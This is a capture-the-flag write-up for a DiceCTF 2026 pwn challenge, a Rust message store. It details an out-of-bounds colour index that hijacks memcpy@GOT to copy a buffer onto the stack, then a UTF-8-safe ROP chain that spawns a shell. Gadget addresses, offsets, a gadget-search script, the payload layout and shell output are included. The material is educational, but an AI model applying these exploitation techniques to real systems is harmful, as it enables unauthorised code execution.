# message-store

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | DiceCTF 2026                   |
| Category    | pwn                            |
| Difficulty  | Medium                         |
| Connection  | `nc message-store.chals.dicec.tf 1337` |

## Description

> I have written a 100% safe store for all your safety-critical messages. Come say hello.

Rust binary that allows storing and displaying messages with ANSI colors.

## TL;DR

OOB index in `set_message_color` allows selecting any GOT entry as a function pointer. Using `memcpy@GOT` (COLOR=3356), `print_message` copies the global BUFFER (0x1000 bytes) onto the stack, overwriting the return address with a ROP chain that executes `execve("/bin/sh", NULL, NULL)`. The full payload must be valid UTF-8.

## Initial Analysis

```
$ file challenge
ELF 64-bit LSB executable, x86-64, dynamically linked, with debug_info, not stripped

$ checksec --file=challenge
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x200000)
    Stripped:   No
    Debuginfo:  Yes

$ strings challenge | grep -E "GCC|rustc"
GCC: (GNU) 15.2.1 20260103
rustc version 1.95.0-nightly (d940e5684 2026-01-19)
```

Rust binary, No PIE, No Canary, Full RELRO. Requires GLIBC 2.39.

### Main Functions

| Function | Address | Description |
|----------|---------|-------------|
| `main` | 0x243b90 | Menu: 1=Set, 2=Color, 3=Print, 4=Exit |
| `set_message` | 0x243960 | Reads input into global BUFFER (0x2f9e38, 0x1000 bytes) |
| `set_message_color` | 0x243b50 | Reads u32 COLOR without bounds check |
| `print_message` | 0x243a50 | Converts BUFFER to string, applies color, prints |
| `input_bytes` | 0x243700 | Reads stdin until newline |

### Globals

- `BUFFER` @ 0x2f9e38 (0x1000 bytes, .bss)
- `COLOR` @ 0x2f93b0 (u64, .data)
- Function pointer table @ 0x2f08e8 (7 entries in .data.rel.ro)

## Vulnerability Identified

### Type: CWE-129 Improper Validation of Array Index

`set_message_color` accepts any u32 value for COLOR without verifying that it is within the range [0, 6]. In `print_message`, COLOR is used as an index:

```nasm
; print_message @ 0x243a6f
mov rax, [COLOR]          ; load unchecked COLOR
lea rcx, [0x2f08e8]       ; TABLE_BASE
mov r14, [rcx + rax*8]    ; r14 = function pointer (OOB read!)
; ...
call r14                  ; call arbitrary function pointer
```

The normal table has 7 entries (Red..White). With COLOR=3356, the index points to `memcpy@GOT` (0x2f71c8), whose value is the address of `memcpy` in libc.

## Solution Process

### Step 1: Understand the print_message flow

```nasm
; 1. Converts BUFFER to &str via from_utf8_lossy
lea rsi, [BUFFER]           ; rsi = 0x2f9e38
mov edx, 0x1000             ; length
mov rdi, rbx                ; dest = rsp (Cow result)
call [from_utf8_lossy]

; 2. Load function pointer from COLOR table
mov rax, [COLOR]
lea rcx, [TABLE_BASE]
mov r14, [rcx + rax*8]      ; hijacked to memcpy

; 3. Deref Cow to get &str
call [Cow::deref]            ; returns (rax=ptr, rdx=len)

; 4. Call "color function" with (dest=rsp+0x18, src=rax, len=rdx)
lea rdi, [rsp+0x18]
mov rsi, rax
call r14                     ; memcpy(rsp+0x18, BUFFER, 0x1000)!

; ... post-memcpy code prints the fake ColoredString ...

; 5. Epilogue
add rsp, 0x68
pop rbx                      ; buf[0x50]
pop r14                      ; buf[0x58]
ret                          ; buf[0x60] ← ROP chain!
```

When `r14 = memcpy`, the call becomes `memcpy(rsp+0x18, BUFFER, 0x1000)`, copying 4096 bytes from the global BUFFER onto the stack frame, including the return address.

### Step 2: Calculate stack offsets

```
rsp+0x00: Cow result (from from_utf8_lossy) - NOT overwritten
rsp+0x18: memcpy dest start = buf[0x00] (fake ColoredString)
rsp+0x68: saved rbx = buf[0x50]
rsp+0x70: saved r14 = buf[0x58]
rsp+0x78: return address = buf[0x60] ← ROP chain
```

### Step 3: UTF-8 constraint

`from_utf8_lossy` must return `Cow::Borrowed` (not Owned) so that `rsi` points to BUFFER. This requires that all 0x1000 bytes are valid UTF-8. The buffer defaults to zeros (valid), and the gadget addresses in little-endian must be valid UTF-8.

UTF-8 rules: bytes < 0x80 are ASCII (always valid). Bytes >= 0x80 must form valid multibyte sequences.

### Step 4: Search for UTF-8-safe gadgets

ROPgadget/ropper fail on this Rust binary. Manual opcode search in .text (0x242c90 - 0x2EF7B5):

```python
# Search for pop rdi; ret (5f c3)
python3 -c "
data = open('challenge','rb').read()
text_start = 0x242c90
for i in range(0x41c90, 0x41c90+0xACB25):
    if data[i:i+2] == b'\x5f\xc3':
        addr = i - 0x41c90 + text_start
        print(f'pop rdi; ret @ 0x{addr:x}')
"
```

Gadgets found (all with bytes < 0x80 in LE):

| Gadget | Address | LE Bytes |
|--------|---------|----------|
| `xor edx, edx; mov rax, rdi; pop rbp; ret` | 0x2d3d7b | 7b 3d 2d 00 |
| `pop rcx; ret` | 0x247566 | 66 75 24 00 |
| `pop rdi; ret` | 0x243565 | 65 35 24 00 |
| `pop rsi; ret` | 0x243431 | 31 34 24 00 |
| `call [syscall@GOT]` | 0x265e32 | 32 5e 26 00 |

### Step 5: Place "/bin/sh" in a UTF-8-safe zone

The address of "/bin/sh" in BUFFER has byte 0x9E (second byte of 0x2f9e38+offset). For it to be valid UTF-8, the preceding byte must be 0xC2 (forming a 2-byte sequence C2 9E).

Solution: place "/bin/sh\0" at BUFFER+0x18A, giving address 0x2f9fc2. In LE: `C2 9F 2F 00` — C2 9F is valid UTF-8 (U+009F).

### Step 6: ROP chain via libc syscall() wrapper

The libc `syscall()` wrapper has the following calling convention:
- rdi = syscall number -> rax
- rsi = arg1 -> rdi (kernel)
- rdx = arg2 -> rsi (kernel)
- rcx = arg3 -> rdx (kernel)

For `execve("/bin/sh", NULL, NULL)`:
1. `xor edx, edx` -> rdx = 0 (argv)
2. `pop rcx; 0` -> rcx = 0 (envp)
3. `pop rdi; 59` -> rdi = SYS_execve
4. `pop rsi; &"/bin/sh"` -> rsi = filename
5. `call [syscall@GOT]` -> syscall(59, "/bin/sh", 0, 0)

### Step 7: Fake ColoredString

The buffer starts with a fake ColoredString to survive the post-memcpy code:
```
buf[0x00] = 1    # String ptr = NonNull::dangling() (non-zero, non-null)
buf[0x08] = 0    # String len = 0 (empty string → no read from dangling ptr)
buf[0x10] = 0    # String cap = 0 (no dealloc on drop)
buf[0x18..] = 0  # No colors/styles → minimal Display output
```

## Discarded Approaches

1. **Test without ROP chain** — memcpy works but ret jumps to NULL, causing a crash (initially confused with "not working on remote")
2. **ROPgadget/ropper** — 0 results on Rust binary. Manual search was necessary
3. **pop rdx gadget** — no ASCII-safe one exists. Used `xor edx, edx` instead
4. **syscall; ret gadget** — does not exist. Used `call [syscall@GOT]` which calls the libc wrapper
5. **Arbitrary /bin/sh address** — byte 0x9E requires care for UTF-8. Offset 0x18A produces valid C2 9F

## Final Exploit

See `exploit.py` — the full payload:

```python
# COLOR=3356 → memcpy@GOT → memcpy(stack, BUFFER, 0x1000)
# buf[0x00]: fake ColoredString (ptr=1, len=0, cap=0)
# buf[0x60]: ROP chain (xor edx → pop rcx → pop rdi → pop rsi → call syscall)
# buf[0x18A]: "/bin/sh\0"
```

## Execution

```bash
python3 exploit.py           # Local
python3 exploit.py REMOTE    # Remote
python3 exploit.py GDB       # Debug
```

```
[+] Payload is valid UTF-8
[*] Payload size: 4096 bytes
[*] COLOR index for memcpy@GOT: 3356
[*] Triggering print_message (memcpy → ROP → execve)...
[+] Shell output:
    PWNED
    uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
    dice{w0w...ru5t_1snt_s4f3??}
```

## Flag

```
dice{w0w...ru5t_1snt_s4f3??}
```

## Key Lessons

- "100% safe Rust" means nothing if there is a missing bounds check in the program logic (unvalidated COLOR index)
- In Rust binaries, ROPgadget/ropper may fail. Manual opcode search in .text is necessary
- UTF-8 validity as an exploitation constraint: all payload bytes must be valid UTF-8 so that `from_utf8_lossy` returns `Cow::Borrowed` (direct reference to the buffer, not a heap copy)
- Exploit tests without a ROP chain appear to "fail" because ret jumps to NULL. Always test with the full payload
- The libc `syscall()` wrapper remaps registers: rdi->rax, rsi->rdi, rdx->rsi, rcx->rdx

## References

- [Rust colored crate](https://docs.rs/colored/) — ColoredString struct layout
- [x86-64 calling convention](https://wiki.osdev.org/System_V_ABI) — register usage
- [UTF-8 encoding table](https://en.wikipedia.org/wiki/UTF-8#Encoding) — valid byte sequences
